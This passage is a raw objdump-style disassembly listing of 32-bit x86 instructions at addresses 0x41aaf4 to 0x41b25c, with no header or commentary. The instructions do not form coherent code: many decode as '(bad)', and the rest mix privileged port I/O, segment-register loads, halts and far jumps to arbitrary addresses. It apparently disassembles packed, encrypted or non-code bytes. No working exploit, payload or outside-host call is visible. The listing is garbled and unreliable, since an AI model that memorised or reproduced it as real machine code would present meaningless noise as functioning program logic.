  41aaf4:	xor    DWORD PTR [edx+ecx*1],ebp
  41aaf7:	cmp    eax,0x847ef81b
  41aafc:	sub    BYTE PTR [eax+0x51889655],bh
  41ab02:	mov    edi,0x7f989284
  41ab07:	call   0xe4ef:0xb0bc6bc1
  41ab0e:	and    ah,BYTE PTR [edx-0x24]
  41ab11:	adc    eax,DWORD PTR [ebp-0x2fcebc72]
  41ab17:	pop    ds
  41ab18:	adc    esp,eax
  41ab1a:	(bad)  
  41ab1b:	lahf   
  41ab1c:	outs   dx,BYTE PTR ds:[esi]
  41ab1d:	(bad)  
  41ab1e:	push   ebp
  41ab1f:	ds push eax
  41ab21:	neg    eax
  41ab23:	lods   eax,DWORD PTR ds:[esi]
  41ab24:	xchg   esp,eax
  41ab25:	adc    edx,DWORD PTR [ebx+0x12]
  41ab28:	neg    cl
  41ab2a:	dec    edx
  41ab2b:	jbe    0x41ab70
  41ab2d:	xchg   ebp,eax
  41ab2e:	lea    ecx,[edx+eiz*8]
  41ab31:	aad    0x98
  41ab33:	cmp    cl,bl
  41ab35:	mov    edi,0xdeb447af
  41ab3a:	cmp    DWORD PTR [ebp+0x40ce4171],ebp
  41ab40:	push   cs
  41ab41:	inc    esp
  41ab42:	and    BYTE PTR [ecx-0x58d8795f],ah
  41ab48:	cmp    eax,0xb0b89ad2
  41ab4d:	pop    ds
  41ab4e:	(bad)  
  41ab4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab50:	mov    ss,edi
  41ab52:	push   edi
  41ab53:	not    BYTE PTR [ebx]
  41ab55:	cmp    al,0x12
  41ab57:	mov    ah,0xff
  41ab59:	loopne 0x41ab78
  41ab5b:	shl    ecx,0x54
  41ab5e:	and    eax,0x7806bfec
  41ab63:	das    
  41ab64:	les    eax,FWORD PTR [esi]
  41ab66:	sub    DWORD PTR [ecx+0x18adbe58],0xd9032e95
  41ab70:	cwde   
  41ab71:	mov    cl,0xd2
  41ab73:	sbb    BYTE PTR [ebp-0x193d3909],0x8b
  41ab7a:	lods   eax,DWORD PTR ds:[esi]
  41ab7b:	aad    0xc6
  41ab7d:	inc    esi
  41ab7e:	or     BYTE PTR [edi-0x54dee3f1],cl
  41ab84:	sbb    esi,DWORD PTR [ebx-0x75820118]
  41ab8a:	sar    BYTE PTR [eax-0x9],0x6f
  41ab8e:	xchg   ecx,eax
  41ab8f:	popf   
  41ab90:	xchg   DWORD PTR [ebp-0x1b712f8a],esi
  41ab96:	nop
  41ab97:	inc    eax
  41ab98:	add    ch,bl
  41ab9a:	sti    
  41ab9b:	cmp    al,BYTE PTR ds:0x519c4a15
  41aba1:	jae    0x41ab47
  41aba3:	inc    eax
  41aba4:	adc    cl,ah
  41aba6:	dec    esi
  41aba7:	ins    BYTE PTR es:[edi],dx
  41aba8:	mov    DWORD PTR [edi],eax
  41abaa:	jb     0x41abc5
  41abac:	jno    0x41ac14
  41abae:	fild   WORD PTR [edi+0x78]
  41abb1:	rol    bl,cl
  41abb3:	mov    ds:0x3d29c95d,al
  41abb8:	fsub   DWORD PTR [ebp+0x1e]
  41abbb:	xchg   esi,eax
  41abbc:	mov    edx,0x5da8c2bf
  41abc1:	and    eax,0x55fa5f68
  41abc6:	inc    esi
  41abc7:	addr16 cmp ebx,esi
  41abca:	jle    0x41ab73
  41abcc:	repz retf 0xe15e
  41abd0:	jb     0x41aba1
  41abd2:	stc    
  41abd3:	add    al,0x8f
  41abd5:	mov    eax,ds:0xefefff57
  41abda:	ins    DWORD PTR es:[edi],dx
  41abdb:	lods   al,BYTE PTR ds:[esi]
  41abdc:	(bad)  
  41abdd:	(bad)  
  41abe0:	clc    
  41abe1:	in     eax,dx
  41abe2:	jl     0x41ab9a
  41abe4:	xor    DWORD PTR [ecx+0x4f],eax
  41abe7:	ja     0x41ac34
  41abe9:	lea    ecx,[esi-0xc871805]
  41abef:	pusha  
  41abf0:	(bad)  
  41abf1:	cdq    
  41abf2:	sbb    bh,BYTE PTR [esi+esi*4-0x2e]
  41abf6:	mov    DWORD PTR [edi+0x6d],ecx
  41abf9:	push   ss
  41abfa:	je     0x41ac5e
  41abfc:	xchg   ebx,eax
  41abfd:	jl     0x41ac41
  41abff:	mov    WORD PTR [edi],gs
  41ac01:	xchg   esp,eax
  41ac02:	push   0x7b1414b5
  41ac07:	scas   al,BYTE PTR es:[edi]
  41ac08:	sahf   
  41ac09:	arpl   WORD PTR [ebx-0x29b075ab],di
  41ac0f:	pop    esi
  41ac10:	pop    ss
  41ac11:	test   eax,0x78c1e7fd
  41ac16:	mov    esp,0x385fefa0
  41ac1b:	sub    ecx,DWORD PTR [ecx-0x23]
  41ac1e:	cmp    ebx,edi
  41ac20:	scas   al,BYTE PTR es:[edi]
  41ac21:	jmp    0xc5cc:0x4ef5ee1e
  41ac28:	mov    esp,0x718f0ace
  41ac2d:	fld    TBYTE PTR [edx-0x23]
  41ac30:	dec    eax
  41ac31:	or     al,BYTE PTR [ebp-0x44329ebb]
  41ac37:	pop    ebx
  41ac38:	stc    
  41ac39:	retf   
  41ac3a:	lds    esp,FWORD PTR [esi-0x31dad402]
  41ac40:	jle    0x41aca5
  41ac42:	(bad)  
  41ac43:	repz push 0xe1ccd9bd
  41ac49:	scas   al,BYTE PTR es:[edi]
  41ac4a:	jne    0x41ac14
  41ac4c:	sub    DWORD PTR [esi-0x521e4353],ebx
  41ac52:	push   eax
  41ac53:	lods   al,BYTE PTR ds:[esi]
  41ac54:	inc    ebx
  41ac55:	inc    eax
  41ac56:	mov    ss,ebp
  41ac58:	xor    ebx,DWORD PTR [esi+0x17]
  41ac5b:	cwde   
  41ac5c:	adc    ebx,ebx
  41ac5e:	push   esi
  41ac5f:	outs   dx,DWORD PTR ds:[esi]
  41ac60:	fisubr WORD PTR [ecx]
  41ac62:	adc    ch,bh
  41ac64:	retf   
  41ac65:	or     bl,bl
  41ac67:	not    BYTE PTR [ebx]
  41ac69:	push   edi
  41ac6a:	mov    ds:0xe10727b1,al
  41ac6f:	mov    al,0x87
  41ac71:	push   eax
  41ac72:	pushf  
  41ac73:	test   DWORD PTR [ebp+0x77],ebp
  41ac76:	push   ebx
  41ac77:	xor    eax,0xe85d9a25
  41ac7c:	bound  eax,QWORD PTR [edi-0x44928af6]
  41ac82:	mov    ebx,0xc67e63c9
  41ac87:	popa   
  41ac88:	push   ecx
  41ac89:	mov    esp,0x2173ef63
  41ac8e:	mov    eax,0x80380b62
  41ac93:	pop    eax
  41ac94:	dec    ecx
  41ac95:	in     eax,dx
  41ac96:	lea    ebp,ds:0x7f141f45
  41ac9c:	fisttp QWORD PTR [esi-0x1814ea01]
  41aca2:	fdiv   DWORD PTR [ecx]
  41aca4:	jp     0x41acbf
  41aca6:	in     al,0x6
  41aca8:	xor    eax,0x2ae37656
  41acad:	test   al,0xb9
  41acaf:	push   es
  41acb0:	retf   0x9307
  41acb3:	shl    ebp,cl
  41acb5:	call   0xb765152a
  41acba:	ret    0x6c24
  41acbd:	call   0x755f:0x9a1e7266
  41acc4:	hlt    
  41acc5:	mov    eax,DWORD PTR [ecx+0x49]
  41acc8:	sar    DWORD PTR [ecx+0x44],1
  41accb:	dec    edi
  41accc:	cmp    al,0x83
  41acce:	cld    
  41accf:	loopne 0x41ac78
  41acd1:	dec    ebx
  41acd2:	lea    ebp,[ecx]
  41acd4:	mov    dh,0x5d
  41acd6:	nop
  41acd7:	or     esi,esp
  41acd9:	push   ebp
  41acda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acdb:	in     eax,0x9b
  41acdd:	dec    edi
  41acde:	das    
  41acdf:	std    
  41ace0:	xor    al,0xc7
  41ace2:	mov    bh,0x4
  41ace4:	fcomip st,st(2)
  41ace6:	mov    dl,0x4c
  41ace8:	mov    dl,0x13
  41acea:	cmc    
  41aceb:	rcl    cl,cl
  41aced:	mov    DWORD PTR ds:0x7d7966c4,eax
  41acf3:	inc    edi
  41acf4:	mov    edi,0xb0367fa7
  41acf9:	cli    
  41acfa:	in     eax,dx
  41acfb:	(bad)  [ebp+0x4b9424e0]
  41ad01:	into   
  41ad02:	jns    0x41acc7
  41ad04:	fldenv [ecx+0x3b24d6a5]
  41ad0a:	out    0x54,eax
  41ad0c:	test   eax,0xc9ea5551
  41ad11:	jecxz  0x41acb0
  41ad13:	pushf  
  41ad14:	fstp   DWORD PTR [edx]
  41ad16:	stc    
  41ad17:	les    edx,FWORD PTR [esi+0x3c]
  41ad1a:	push   eax
  41ad1b:	dec    edi
  41ad1c:	cmp    bl,BYTE PTR [esi]
  41ad1e:	push   es
  41ad1f:	add    ecx,DWORD PTR [edi]
  41ad21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad22:	xor    al,0xdf
  41ad24:	add    DWORD PTR [edx+0x19c38388],esi
  41ad2a:	mov    ah,0xb7
  41ad2c:	xchg   DWORD PTR [edx-0x68],eax
  41ad2f:	out    0x67,al
  41ad31:	jl     0x41ad08
  41ad33:	lea    edx,[eax]
  41ad35:	lods   eax,DWORD PTR ds:[esi]
  41ad36:	jmp    0x41ad52
  41ad38:	inc    BYTE PTR gs:[edx+0x9d9a81e]
  41ad3f:	mov    al,ds:0x47d0fae
  41ad44:	lods   eax,DWORD PTR ds:[esi]
  41ad45:	cmp    BYTE PTR [edi],dl
  41ad47:	int    0xe0
  41ad49:	pusha  
  41ad4a:	push   edx
  41ad4b:	(bad)  
  41ad4c:	or     ah,bl
  41ad4e:	push   0xc1fbd153
  41ad53:	pusha  
  41ad54:	add    al,0x29
  41ad56:	repz leave 
  41ad58:	sub    eax,0xb37de93a
  41ad5d:	mov    bh,bl
  41ad5f:	cmp    al,0x8b
  41ad61:	dec    esp
  41ad62:	fdivr  DWORD PTR [edx-0x346717eb]
  41ad68:	adc    DWORD PTR [esi],edx
  41ad6a:	xchg   BYTE PTR [eax],bl
  41ad6c:	mov    ecx,0x875a13a4
  41ad71:	cmc    
  41ad72:	jmp    0x41add3
  41ad74:	test   cl,0x4c
  41ad77:	inc    ebx
  41ad78:	mov    fs,WORD PTR [eax-0x68117e2a]
  41ad7e:	inc    ebx
  41ad7f:	push   esp
  41ad80:	jg     0x41ad92
  41ad82:	(bad)  
  41ad83:	dec    ecx
  41ad84:	dec    ebx
  41ad85:	clc    
  41ad86:	sub    esi,DWORD PTR [edx]
  41ad88:	or     ebp,edi
  41ad8a:	adc    eax,0xce0e3de6
  41ad8f:	inc    edx
  41ad90:	sbb    DWORD PTR [ebp-0x22],0xffffffdf
  41ad94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad95:	jns    0x41ada8
  41ad97:	int3   
  41ad98:	sbb    al,0x3c
  41ad9a:	mov    dh,0x9f
  41ad9c:	inc    edi
  41ad9d:	push   ebx
  41ad9e:	clc    
  41ad9f:	mov    ah,BYTE PTR [ecx-0x28812c38]
  41ada5:	mov    ds:0xe1ecab3d,al
  41adaa:	nop
  41adab:	add    al,ch
  41adad:	xchg   ebp,eax
  41adae:	lds    eax,FWORD PTR [edi+0x5b700f4a]
  41adb4:	xor    al,0x2a
  41adb6:	mov    edi,0xe7c3859c
  41adbb:	jl     0x41adfe
  41adbd:	leave  
  41adbe:	dec    eax
  41adbf:	sahf   
  41adc0:	pop    esp
  41adc1:	jge    0x41ad52
  41adc3:	jbe    0x41ae41
  41adc5:	push   esi
  41adc6:	dec    esi
  41adc7:	mov    WORD PTR [ebp+0x45e6d87c],cs
  41adcd:	imul   esi,DWORD PTR [esi-0x1cb833a7],0x37a4a204
  41add7:	mov    ah,0x88
  41add9:	fcomp  QWORD PTR [ebp+0x62]
  41addc:	outs   dx,BYTE PTR ds:[esi]
  41addd:	xor    bh,BYTE PTR [esi+0x7fb297c8]
  41ade3:	sbb    eax,0xaacf635f
  41ade8:	pop    esp
  41ade9:	mov    eax,0x157ddd88
  41adee:	mov    DWORD PTR [ecx+0x16],esp
  41adf1:	in     al,0x4b
  41adf3:	xchg   esp,eax
  41adf4:	hlt    
  41adf5:	jno    0x41ad83
  41adf7:	sub    ebp,esp
  41adf9:	xchg   BYTE PTR [ecx+0xe192226],bl
  41adff:	in     al,dx
  41ae00:	dec    ecx
  41ae01:	daa    
  41ae02:	add    BYTE PTR [ecx+0x46134dd1],dh
  41ae08:	ja     0x41ae6b
  41ae0a:	push   ss
  41ae0b:	pop    ds
  41ae0c:	cmp    eax,DWORD PTR [eax-0x69f98cc1]
  41ae12:	push   ebx
  41ae13:	jns    0x41ae45
  41ae15:	cmp    cl,BYTE PTR [edx]
  41ae17:	mov    dh,BYTE PTR [edx+0x13f6f263]
  41ae1d:	cdq    
  41ae1e:	jnp    0x41ae33
  41ae20:	or     al,BYTE PTR [eax-0x74f56dbe]
  41ae26:	push   0x1068fd76
  41ae2b:	sbb    edi,DWORD PTR [eax]
  41ae2d:	push   edi
  41ae2e:	add    ch,dl
  41ae30:	jl     0x41ae04
  41ae32:	jno    0x41ae9d
  41ae34:	pusha  
  41ae35:	pop    ds
  41ae36:	aam    0x5e
  41ae38:	lds    ebp,FWORD PTR ds:0xdb6264a5
  41ae3e:	or     al,0x56
  41ae40:	arpl   WORD PTR [ebx],ax
  41ae42:	add    cl,BYTE PTR [edx+0x488e0a66]
  41ae48:	loop   0x41aec2
  41ae4a:	pushf  
  41ae4b:	pop    es
  41ae4c:	dec    edi
  41ae4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4e:	pop    esp
  41ae4f:	js     0x41aec0
  41ae51:	xchg   ebp,eax
  41ae52:	aas    
  41ae53:	add    BYTE PTR [ebx],ch
  41ae55:	add    al,0x50
  41ae57:	pop    esp
  41ae58:	and    DWORD PTR [ebp-0x7a4c678a],esi
  41ae5e:	and    dh,BYTE PTR [ebp+0x9a10428]
  41ae64:	jmp    FWORD PTR [ebx-0x3f45666e]
  41ae6a:	add    al,0xca
  41ae6c:	sub    ebx,DWORD PTR [eax]
  41ae6e:	nop
  41ae6f:	pusha  
  41ae70:	push   0xffffff8b
  41ae72:	mov    ebx,0xd0849de4
  41ae77:	cmp    al,0x4
  41ae79:	jg     0x41ae63
  41ae7b:	mov    ds:0xf2c77cf9,al
  41ae80:	jg     0x41ae97
  41ae82:	or     al,0x35
  41ae84:	sti    
  41ae85:	or     al,0xea
  41ae87:	xchg   BYTE PTR [edi],bl
  41ae89:	fld    TBYTE PTR [ebx-0x27]
  41ae8c:	sub    al,0xd1
  41ae8e:	cmp    BYTE PTR [eax+0x56],ch
  41ae91:	cmp    al,BYTE PTR [ecx+0x4d2518cd]
  41ae97:	leave  
  41ae98:	sub    BYTE PTR [edi+0x6502cda3],0x48
  41ae9f:	aad    0xc2
  41aea1:	add    DWORD PTR [esi+0x206ca46],edi
  41aea7:	call   0xc2733026
  41aeac:	pop    edi
  41aead:	adc    al,cl
  41aeaf:	add    al,0x61
  41aeb1:	mov    bl,0x72
  41aeb3:	stos   BYTE PTR es:[edi],al
  41aeb4:	(bad)  
  41aeb5:	mov    eax,ds:0xbac611a0
  41aeba:	mov    ch,0x34
  41aebc:	shl    bp,1
  41aebf:	push   edx
  41aec0:	or     bh,bh
  41aec2:	loop   0x41ae4f
  41aec4:	dec    esi
  41aec5:	mov    DWORD PTR [edi],ebx
  41aec7:	inc    ecx
  41aec8:	pop    es
  41aec9:	ret    
  41aeca:	push   ds
  41aecb:	jecxz  0x41aead
  41aecd:	ds push cs
  41aecf:	jg     0x41af38
  41aed1:	jnp    0x41af28
  41aed3:	push   0x0
  41aed5:	mov    eax,0x2ddb8f3a
  41aeda:	xchg   ecx,eax
  41aedb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aedc:	mov    ds:0x96f57354,eax
  41aee1:	xor    eax,0x7585f420
  41aee6:	sti    
  41aee7:	mov    ebp,0x60681ae1
  41aeec:	rcr    edx,cl
  41aeee:	adc    al,dl
  41aef0:	jmp    0x41aea6
  41aef2:	push   ds
  41aef3:	mov    bh,0x40
  41aef5:	sub    DWORD PTR [ecx+esi*1-0x213273da],esi
  41aefc:	inc    esp
  41aefd:	sub    dh,BYTE PTR [ebx+0x2e]
  41af00:	cmp    eax,DWORD PTR [ebx-0x2]
  41af03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af04:	bound  ebp,QWORD PTR [edx-0x19]
  41af07:	out    0xea,eax
  41af09:	and    al,0x64
  41af0b:	sbb    DWORD PTR [ecx-0x1c],ecx
  41af0e:	dec    ecx
  41af0f:	sub    al,0x50
  41af12:	mov    edi,0x17f04024
  41af17:	cmp    BYTE PTR ds:0x6bd30696,dh
  41af1d:	jmp    0x41af6d
  41af1f:	retf   0x3d2c
  41af22:	add    al,0x22
  41af24:	enter  0x20aa,0xac
  41af28:	mov    edx,DWORD PTR [edi]
  41af2a:	ins    BYTE PTR es:[edi],dx
  41af2b:	sub    dh,BYTE PTR [ebx-0x3b]
  41af2e:	cmp    eax,0xa34a690d
  41af33:	inc    esp
  41af34:	pop    esi
  41af35:	pusha  
  41af36:	iret   
  41af37:	jnp    0x41af67
  41af39:	jb     0x41af66
  41af3b:	push   edi
  41af3c:	(bad)  
  41af3d:	sbb    bl,bh
  41af3f:	rcr    BYTE PTR [esi+ecx*1-0x78],0x82
  41af44:	add    al,BYTE PTR [eax]
  41af46:	adc    ebx,ebp
  41af48:	fimul  WORD PTR [esi+0x2b31d607]
  41af4e:	cdq    
  41af4f:	xor    DWORD PTR [eax],ebx
  41af51:	fwait
  41af52:	in     eax,0x6f
  41af54:	je     0x41af1e
  41af56:	into   
  41af57:	repnz std 
  41af59:	mov    BYTE PTR ds:0xfa1207e9,ch
  41af5f:	push   cs
  41af60:	xchg   ch,dl
  41af62:	repnz test al,0x5b
  41af65:	mov    bh,0xb7
  41af67:	mul    bh
  41af69:	inc    eax
  41af6a:	mov    esp,0x8962f394
  41af6f:	fist   WORD PTR [ebp-0x7d]
  41af72:	addr16 sahf 
  41af74:	mov    esp,0xee9bbb10
  41af79:	ss out 0x7e,al
  41af7c:	aas    
  41af7d:	inc    eax
  41af7e:	or     edi,DWORD PTR [ebp-0x2d3b830f]
  41af84:	fmul   DWORD PTR [ecx+ebx*1-0x4547ce32]
  41af8b:	mov    eax,ds:0x9294d844
  41af90:	mov    ebp,0x8cb08db7
  41af95:	outs   dx,DWORD PTR ds:[esi]
  41af96:	dec    edx
  41af97:	sub    ah,ah
  41af99:	scas   al,BYTE PTR es:[edi]
  41af9a:	gs (bad) 
  41af9c:	sub    dh,dh
  41af9e:	xchg   ebp,eax
  41af9f:	jecxz  0x41afc2
  41afa1:	jbe    0x41afc8
  41afa3:	pop    ebx
  41afa4:	test   ecx,edx
  41afa6:	loopne 0x41b009
  41afa8:	lods   eax,DWORD PTR ds:[esi]
  41afa9:	ficom  WORD PTR [ebp+0x58cb5046]
  41afaf:	add    ebx,DWORD PTR [eax+ebp*4-0x619e5141]
  41afb6:	in     eax,dx
  41afb7:	mov    ebx,0x4a878e44
  41afbc:	adc    al,BYTE PTR [esi-0x80]
  41afbf:	mov    ch,0x5c
  41afc1:	xchg   ebp,eax
  41afc2:	sbb    BYTE PTR [esi+0x26f89545],dh
  41afc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afc9:	sub    dl,BYTE PTR ds:0x82af98e8
  41afcf:	leave  
  41afd0:	js     0x41af91
  41afd2:	jo     0x41b040
  41afd4:	adc    bl,BYTE PTR cs:0x14682ad8
  41afdb:	int3   
  41afdc:	call   0x38aad536
  41afe1:	fwait
  41afe2:	mov    ds:0x90c6514d,al
  41afe7:	out    0xdd,al
  41afe9:	sub    bl,BYTE PTR [esi]
  41afeb:	cdq    
  41afec:	sbb    BYTE PTR [eax+0x35],0x65
  41aff0:	xlat   BYTE PTR ds:[ebx]
  41aff1:	loop   0x41b000
  41aff3:	adc    eax,eax
  41aff5:	mov    dh,0x43
  41aff7:	inc    edi
  41aff8:	test   eax,0xd4035a5a
  41affd:	jne    0x41b065
  41afff:	dec    eax
  41b000:	loop   0x41b023
  41b002:	xchg   esp,eax
  41b003:	xchg   edi,eax
  41b004:	pushf  
  41b005:	(bad)  
  41b006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b007:	out    dx,eax
  41b008:	jne    0x41b02d
  41b00a:	xchg   esp,eax
  41b00b:	push   ebx
  41b00c:	dec    ebp
  41b00d:	add    bl,dl
  41b00f:	jae    0x41af9c
  41b011:	imul   edx,DWORD PTR [esi-0x73],0x45
  41b015:	sti    
  41b016:	test   al,cl
  41b018:	pop    esi
  41b019:	repz int3 
  41b01b:	jp     0x41b071
  41b01d:	jge    0x41b098
  41b01f:	iret   
  41b020:	and    DWORD PTR [ebx],ecx
  41b022:	jae    0x41afde
  41b024:	jae    0x41b040
  41b026:	shr    BYTE PTR [edi],0xbf
  41b029:	adc    ebp,esp
  41b02b:	mov    ebx,0xf16ddad7
  41b030:	dec    ebx
  41b031:	cmp    esi,edi
  41b033:	(bad)  
  41b035:	fisttp WORD PTR [edx-0x455e1e32]
  41b03b:	je     0x41b043
  41b03d:	test   eax,0xbfbec07b
  41b042:	cmp    esp,DWORD PTR [ebp+0xe]
  41b045:	fbld   TBYTE PTR [edi]
  41b047:	pop    esi
  41b048:	imul   ebp,edi,0x4b2f1007
  41b04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b04f:	ja     0x41b051
  41b051:	(bad)  
  41b052:	ror    DWORD PTR [eax-0x25],cl
  41b055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b056:	push   es
  41b057:	push   ds
  41b058:	jmp    0x41b08e
  41b05a:	xor    al,0xc4
  41b05c:	adc    ecx,ecx
  41b05e:	and    ah,ch
  41b060:	in     eax,dx
  41b061:	stos   BYTE PTR es:[edi],al
  41b062:	pop    edi
  41b063:	loop   0x41b075
  41b065:	mov    dh,0x1b
  41b067:	or     ecx,DWORD PTR [ecx+0x740030d6]
  41b06d:	adc    bl,BYTE PTR [ebp+0x5f]
  41b070:	inc    edi
  41b071:	fild   DWORD PTR [edi+0x3c5ef786]
  41b077:	jbe    0x41b0f3
  41b079:	jle    0x41affc
  41b07b:	pop    ds
  41b07c:	cmp    eax,0x31437f2c
  41b081:	retf   0x35f6
  41b084:	adc    bh,BYTE PTR [edi]
  41b086:	inc    edi
  41b087:	loopne 0x41b054
  41b089:	call   0xc645743b
  41b08e:	outs   dx,DWORD PTR ds:[esi]
  41b08f:	add    al,0xc4
  41b091:	jmp    0xcd077cdd
  41b096:	cmp    al,0xbe
  41b098:	mov    ds:0x671af991,eax
  41b09d:	js     0x41b029
  41b09f:	stc    
  41b0a0:	push   eax
  41b0a1:	test   bl,cl
  41b0a3:	cmp    al,0x91
  41b0a5:	cli    
  41b0a6:	cmc    
  41b0a7:	dec    edx
  41b0a8:	mov    edi,0xadcddc39
  41b0ad:	mov    dh,0x16
  41b0af:	push   eax
  41b0b0:	dec    eax
  41b0b1:	mov    ah,0xe2
  41b0b3:	or     edi,esp
  41b0b5:	jmp    0x41b113
  41b0b7:	call   0x333d4fe2
  41b0bc:	mov    esi,0x5f23ba8d
  41b0c1:	dec    edx
  41b0c2:	sub    BYTE PTR [edx+0x226b4c77],dh
  41b0c8:	outs   dx,DWORD PTR ds:[esi]
  41b0c9:	pushw  ds
  41b0cb:	and    bh,dh
  41b0cd:	xchg   esp,eax
  41b0ce:	push   esp
  41b0cf:	xchg   BYTE PTR [eax],bh
  41b0d1:	outs   dx,BYTE PTR ds:[esi]
  41b0d2:	fstp   TBYTE PTR [esi]
  41b0d4:	loopne 0x41b115
  41b0d6:	loopne 0x41b0cc
  41b0d8:	dec    ebx
  41b0d9:	es stos BYTE PTR es:[edi],al
  41b0db:	add    eax,0x375ccefe
  41b0e0:	into   
  41b0e1:	ja     0x41b0c2
  41b0e3:	xchg   esp,eax
  41b0e4:	in     eax,dx
  41b0e5:	push   esp
  41b0e6:	fs sahf 
  41b0e8:	in     al,0x35
  41b0ea:	popa   
  41b0eb:	mov    eax,ds:0xe583d48f
  41b0f0:	xor    BYTE PTR [edx-0x2a97d5d2],bl
  41b0f6:	mov    DWORD PTR [edx+0x125d9d46],ebx
  41b0fc:	add    BYTE PTR [esi],ah
  41b0fe:	fbstp  TBYTE PTR [edx-0xc0447f4]
  41b104:	xor    al,0xcb
  41b106:	add    BYTE PTR [esi-0x73aff15a],0x5d
  41b10d:	mov    edi,0x27f7a040
  41b112:	mov    esi,0x344c9c8c
  41b117:	es hlt 
  41b119:	stos   BYTE PTR es:[edi],al
  41b11a:	pop    ds
  41b11b:	fsub   st,st(0)
  41b11d:	fsubp  st(7),st
  41b11f:	outs   dx,DWORD PTR ds:[esi]
  41b120:	inc    ebp
  41b121:	jbe    0x41b16d
  41b123:	lahf   
  41b124:	and    DWORD PTR [esi],0x55a85841
  41b12a:	cmp    BYTE PTR [ecx-0x14],bh
  41b12d:	(bad)  
  41b12e:	cld    
  41b12f:	jg     0x41b0ef
  41b131:	jb     0x41b163
  41b133:	mov    edi,0x73c4c2c3
  41b138:	pop    ds
  41b139:	inc    ebp
  41b13a:	ins    DWORD PTR es:[edi],dx
  41b13b:	lods   al,BYTE PTR ds:[esi]
  41b13c:	jp     0x41b19b
  41b13e:	rol    DWORD PTR ds:0x9cc8f789,1
  41b144:	mov    ebx,0xd7798248
  41b149:	add    DWORD PTR [ebp-0x5cfaebe9],esp
  41b14f:	sub    dl,BYTE PTR [eax+edi*8+0x7d]
  41b153:	jb     0xc6ec2a53
  41b159:	pop    ss
  41b15a:	mov    WORD PTR [ecx+esi*1-0x56],?
  41b15e:	xlat   BYTE PTR ds:[ebx]
  41b15f:	inc    edx
  41b160:	mov    fs,WORD PTR [esp+eax*1+0x42e31783]
  41b167:	mov    ebp,DWORD PTR [ebx]
  41b169:	sahf   
  41b16a:	call   0xa84277b8
  41b16f:	mov    ebx,0x765b8979
  41b174:	or     bl,BYTE PTR [ebx]
  41b176:	in     al,dx
  41b177:	push   ecx
  41b178:	fidivr WORD PTR [esi]
  41b17a:	sub    DWORD PTR [edi],edx
  41b17c:	rcr    BYTE PTR [ecx*1-0x33242917],0x6a
  41b184:	cld    
  41b185:	xor    ecx,DWORD PTR [ecx+esi*1-0x7c]
  41b189:	hlt    
  41b18a:	fcom   QWORD PTR [esi-0x3d]
  41b18d:	mov    al,0x84
  41b18f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b191:	inc    esi
  41b192:	jb     0x41b17f
  41b194:	push   es
  41b195:	mov    dl,0x1a
  41b197:	mulps  xmm1,XMMWORD PTR [eax+0x36ee1624]
  41b19e:	mov    dh,0xff
  41b1a0:	enter  0x3a43,0xb7
  41b1a4:	or     al,0x80
  41b1a6:	popf   
  41b1a7:	pop    esi
  41b1a8:	jl     0x41b15d
  41b1aa:	fwait
  41b1ab:	and    al,0x38
  41b1ad:	jle    0x41b1d0
  41b1af:	mov    edi,0x82ff498e
  41b1b4:	pop    eax
  41b1b5:	adc    al,0xf0
  41b1b7:	push   esp
  41b1b8:	sub    ch,BYTE PTR [edx]
  41b1ba:	pop    ds
  41b1bb:	cmp    cl,al
  41b1bd:	push   cs
  41b1be:	sti    
  41b1bf:	repnz inc edi
  41b1c1:	arpl   WORD PTR [eax+ebx*4+0x5e49b97d],cx
  41b1c8:	in     eax,dx
  41b1c9:	sub    al,0xe6
  41b1cb:	dec    edi
  41b1cc:	xor    edi,DWORD PTR [edi-0x4a]
  41b1cf:	add    eax,0x6a6a8d19
  41b1d4:	mov    ah,0xd1
  41b1d6:	shl    DWORD PTR [esi-0xf],1
  41b1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1da:	pop    edx
  41b1db:	pop    eax
  41b1dc:	mov    ds:0x7707d9b4,al
  41b1e1:	dec    cx
  41b1e3:	xor    DWORD PTR [ecx],esp
  41b1e5:	(bad)  
  41b1e6:	sbb    eax,0x7ff0495f
  41b1eb:	mov    ebx,0x6be20f80
  41b1f0:	xor    BYTE PTR [eax+0x50],ch
  41b1f3:	nop
  41b1f4:	jns    0x41b235
  41b1f6:	xor    cl,BYTE PTR [ebp+0x21389b77]
  41b1fc:	push   0xd8825a7
  41b201:	dec    ecx
  41b202:	clc    
  41b203:	dec    edx
  41b204:	loopne 0x41b194
  41b206:	fist   WORD PTR [eax-0x3e]
  41b209:	ret    0xc10e
  41b20c:	push   0x74
  41b20e:	dec    esi
  41b20f:	and    ah,BYTE PTR fs:[edx+0xd]
  41b213:	gs mov dl,0x52
  41b216:	mov    bh,0x4d
  41b218:	stos   DWORD PTR es:[edi],eax
  41b219:	pop    eax
  41b21a:	pop    eax
  41b21b:	mov    ss:0x9031492b,al
  41b221:	test   DWORD PTR [esp+0x77],ebp
  41b225:	jae    0x41b25e
  41b227:	mov    ah,0xc5
  41b229:	push   ds
  41b22a:	loope  0x41b200
  41b22c:	cdq    
  41b22d:	sbb    edx,esp
  41b22f:	das    
  41b230:	sub    ebp,edx
  41b232:	mov    edi,0x7086257
  41b237:	arpl   dx,dx
  41b239:	les    esi,FWORD PTR [ebx-0x48]
  41b23c:	sbb    ch,BYTE PTR [eax+0x2649aea4]
  41b242:	adc    esi,DWORD PTR [ecx-0x39]
  41b245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b246:	and    DWORD PTR [eax+0x6fa453a],0xfc94f53c
  41b250:	(bad)  
  41b251:	retf   
  41b252:	popf   
  41b253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b254:	pop    edx
  41b255:	xchg   ecx,eax
  41b256:	xor    bh,BYTE PTR [ebp-0xe5920b4]
  41b25c:	gs je  0x41b210
